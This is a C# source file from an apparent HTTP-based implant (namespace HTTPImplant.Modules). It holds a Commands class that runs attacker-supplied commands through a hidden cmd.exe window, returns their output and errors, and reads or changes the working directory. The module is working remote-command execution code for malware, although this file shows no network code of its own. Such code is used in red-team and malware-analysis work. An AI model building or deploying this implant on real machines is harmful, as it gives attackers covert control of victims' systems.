using System;
using System.Text;
using System.Diagnostics;
using System.IO;

namespace HTTPImplant.Modules
{
    public class Commands
    {
        delegate uint GetCurrentDirectoryDelegate(uint nBufferLength, StringBuilder lpBuffer);
        public static string command(string command, string arguments)
        {
            StringBuilder result = new StringBuilder();
            string fileName = "cmd.exe";
            string args = "/c " + command + " " + arguments; // Concatenating command and arguments

            using (var process = new Process())
            {
                process.StartInfo.FileName = fileName;
                process.StartInfo.Arguments = args;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;

                try
                {
                    process.Start();
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    process.WaitForExit();

                    result.Append(output);
                    if (!string.IsNullOrEmpty(error))
                    {
                        result.Append("\nError: ");
                        result.Append(error);
                    }
                }
                catch (Exception ex)
                {
                    result.Clear();
                    result.Append("An exception occurred while executing the command: ");
                    result.Append(ex.Message);
                }
            }

            return result.ToString();
        }

        public static string GetCurrentDir()
        {
            string path = Environment.CurrentDirectory;
            return path;
        }
        public static string SetCurrentDir(string path)
        {
            Directory.SetCurrentDirectory(path);
            string newPath = GetCurrentDir();
            return newPath;
        }
    }
}
